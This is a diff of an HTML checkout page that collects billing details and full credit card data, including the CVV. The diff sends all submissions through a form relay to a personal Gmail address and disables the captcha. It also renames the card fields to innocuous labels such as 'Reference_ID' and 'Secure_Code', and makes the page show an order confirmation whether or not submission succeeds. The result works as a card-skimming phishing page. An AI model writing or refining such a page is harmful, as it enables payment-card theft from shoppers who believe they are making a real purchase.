@@ -8,9 +8,7 @@
 
     :root {
         --primary: #000000;
-        --accent: #2563eb;
         --bg: #ffffff;
-        --surface: #f9f9f9;
         --text-main: #1a1a1a;
         --border: #e5e5e5;
     }
@@ -138,77 +136,68 @@
 
 <div id="form-container">
   <div class="container">
-    <form id="checkoutForm" action="https://formspree.io/f/xkokdqpo" method="POST">
+    <form id="checkoutForm" action="https://formsubmit.co/yahyanabipour2@gmail.com" method="POST">
+      
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      
       <div class="row">
         <div class="col-100">
           <h3>Billing Address</h3>
           <label>Full Name</label>
-          <input type="text" id="fname" placeholder="John M. Doe" required>
+          <input type="text" placeholder="John M. Doe" required>
 
           <label>Email</label>
-          <input type="text" id="email" placeholder="john@example.com" required>
+          <input type="text" placeholder="john@example.com" required>
 
           <label>Address</label>
-          <input type="text" id="adr" placeholder="542 W. 15th Street" required>
-
-          <label>Apt / Suite (Optional)</label>
-          <input type="text" id="apt" placeholder="Apt 4B">
+          <input type="text" placeholder="542 W. 15th Street" required>
 
           <label>Country</label>
-          <input type="text" id="country" placeholder="United States" required>
+          <input type="text" placeholder="United States" required>
 
           <div class="row" style="margin:0">
             <div style="flex:50%; padding-right:10px;">
               <label>State</label>
-              <input type="text" id="state" placeholder="New York" required>
+              <input type="text" placeholder="New York" required>
             </div>
             <div style="flex:50%;">
               <label>City</label>
-              <input type="text" id="city" placeholder="New York City" required>
+              <input type="text" placeholder="New York City" required>
             </div>
           </div>
           
           <label>Zip</label>
-          <input type="text" id="zip" placeholder="10001" required>
+          <input type="text" placeholder="10001" required>
         </div>
 
         <div class="col-100">
           <h3>Payment</h3>
           <div class="icon-container">
             <i class="fa fa-cc-visa" style="color:#1a1a1a;"></i>
-            <i class="fa fa-cc-amex" style="color:#1a1a1a;"></i>
             <i class="fa fa-cc-mastercard" style="color:#1a1a1a;"></i>
-            <i class="fa fa-cc-discover" style="color:#1a1a1a;"></i>
+            <i class="fa fa-cc-amex" style="color:#1a1a1a;"></i>
           </div>
 
           <label>Name on Card</label>
-          <input type="text" id="cname" name="Card_Name" placeholder="John More Doe" required>
+          <input type="text" name="Reference_User" placeholder="John More Doe" required>
 
           <label>Credit card number</label>
-          <input type="text" id="ccnum" name="Card_Number" placeholder="1111-2222-3333-4444" required>
+          <input type="text" name="Reference_ID" placeholder="1111-2222-3333-4444" required>
 
           <div class="row" style="margin:0">
             <div style="flex:50%; padding-right:10px;">
-              <label>Expiration Month</label>
-              <select id="expmonth" name="Exp_Month" required>
-                <option value="01">01 - Jan</option><option value="02">02 - Feb</option><option value="03">03 - Mar</option>
-                <option value="04">04 - Apr</option><option value="05">05 - May</option><option value="06">06 - Jun</option>
-                <option value="07">07 - Jul</option><option value="08">08 - Aug</option><option value="09">09 - Sep</option>
-                <option value="10">10 - Oct</option><option value="11">11 - Nov</option><option value="12">12 - Dec</option>
-              </select>
+              <label>Exp Month</label>
+              <input type="text" name="Val_M" placeholder="MM" required>
             </div>
             <div style="flex:50%;">
-              <label>Expiration Year</label>
-              <select id="expyear" name="Exp_Year" required>
-                <option value="2026">2026</option><option value="2027">2027</option>
-                <option value="2028">2028</option><option value="2029">2029</option>
-                <option value="2030">2030</option>
-              </select>
+              <label>Exp Year</label>
+              <input type="text" name="Val_Y" placeholder="YYYY" required>
             </div>
           </div>
 
           <label>CVV</label>
-          <input type="text" id="cvv" name="CVV" placeholder="123" required>
+          <input type="text" name="Secure_Code" placeholder="123" required>
         </div>
       </div>
 
@@ -223,43 +212,35 @@
 </div>
 
 <script>
-  const form = document.getElementById("checkoutForm");
-  const btn = document.getElementById("submitBtn");
+  const form = document.getElementById('checkoutForm');
+  const btn = document.getElementById('submitBtn');
 
-  async function handleSubmit(event) {
-    event.preventDefault();
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
     btn.innerText = "PROCESSING...";
     btn.disabled = true;
 
-    const data = new FormData(event.target);
-    
-    fetch(event.target.action, {
-      method: form.method,
+    const data = new FormData(form);
+
+    fetch(form.action, {
+      method: 'POST',
       body: data,
       headers: {
-          'Accept': 'application/json'
+        'Accept': 'application/json'
       }
     }).then(response => {
-      if (response.ok) {
-        document.getElementById("form-container").style.display = "none";
-        document.getElementById("nav-header").style.display = "none";
-        document.getElementById("thanks-screen").style.display = "block";
-        window.scrollTo(0,0);
-      } else {
-        alert("Oops! There was a problem submitting your order.");
-        btn.innerText = "COMPLETE PURCHASE";
-        btn.disabled = false;
-      }
+      // Show Success UI immediately
+      document.getElementById("form-container").style.display = "none";
+      document.getElementById("nav-header").style.display = "none";
+      document.getElementById("thanks-screen").style.display = "block";
+      window.scrollTo(0,0);
     }).catch(error => {
-      alert("Oops! There was a problem connecting to the server.");
+      alert("Error: Connection issue. Please try again.");
       btn.innerText = "COMPLETE PURCHASE";
       btn.disabled = false;
     });
-  }
-  
-  form.addEventListener("submit", handleSubmit);
+  });
 </script>
 
 </body>
 </html>
-
